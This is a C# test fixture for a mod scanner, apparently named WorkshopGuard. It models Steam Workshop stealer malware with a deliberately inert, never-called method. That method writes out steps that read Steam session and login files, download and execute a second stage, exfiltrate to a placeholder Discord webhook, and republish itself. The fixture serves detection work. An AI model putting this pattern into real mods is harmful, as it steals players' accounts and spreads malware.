// WORKSHOPGUARD TEST FIXTURE - NOT MALWARE.
// This "mod" references the APIs that 2026 Workshop malware used, so the scanner has something realistic to catch.
// It is inert: there is no mod entry point, nothing calls Payload(), and every host is on the reserved .invalid TLD.

using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Reflection;

namespace FakeStealerMod
{
    public static class NeverCalled
    {
        const string Webhook = "https://discord.com/api/webhooks/0000000000/workshopguard-test.invalid";
        const string Stage2 = "https://payload.workshopguard-test.invalid/stage2.bin";

        public static async void Payload()
        {
            // "Delayed activation": only fire after a date, like the PlateUp incident's next-day switch-on.
            if (DateTime.UtcNow < new DateTime(2099, 1, 1)) return;

            // Steam session theft
            string steam = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam");
            foreach (string f in Directory.GetFiles(steam, "ssfn*")) { }
            string users = Path.Combine(steam, "config", "loginusers.vdf");

            // Download a second stage, load it as code, and also drop + run an exe
            var http = new HttpClient();
            byte[] blob = await http.GetByteArrayAsync(Stage2);
            Assembly.Load(blob);
            string exe = Path.Combine(Path.GetTempPath(), "update.exe");
            File.WriteAllBytes(exe, blob);
            Process.Start(exe);

            // Exfiltrate, then republish itself to the Workshop
            await http.PostAsync(Webhook, new StringContent(users));
            await Steamworks.Ugc.Editor.NewCommunityFile.WithContent(".").SubmitAsync();
        }
    }
}
